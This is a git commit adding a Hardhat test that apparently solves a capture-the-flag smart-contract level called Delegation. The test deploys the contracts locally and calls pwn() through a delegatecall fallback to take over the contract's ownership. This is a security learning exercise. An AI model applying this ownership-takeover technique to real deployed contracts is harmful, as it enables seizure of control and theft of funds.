3b2f3f4e574abde9ef47194282e5f5ce947b6806
Ivan Kuznetsov <me@jeiwan.ru>
2021-08-20 15:00:45 +0300

    Add Delegation

---
+++ test/Delegation.test.js
@@ -0,0 +1,30 @@
+require("@nomiclabs/hardhat-waffle");
+const { expect } = require("chai");
+
+describe("Delegation", function () {
+  it("attacks", async () => {
+    const [owner, user] = await ethers.getSigners();
+
+    const Delegate = await ethers.getContractFactory("Delegate");
+    const delegate = await Delegate.deploy(user.address);
+    await delegate.deployed();
+
+    const Delegation = await ethers.getContractFactory("Delegation");
+    const delegation = await Delegation.connect(user).deploy(delegate.address);
+    await delegation.deployed();
+
+    expect(await delegation.owner()).to.equal(user.address);
+
+    console.log(delegate.interface);
+
+    const delegated = new ethers.Contract(
+      delegation.address,
+      delegate.interface,
+      owner
+    );
+
+    await delegated.pwn();
+
+    expect(await delegation.owner()).to.equal(owner.address);
+  });
+});
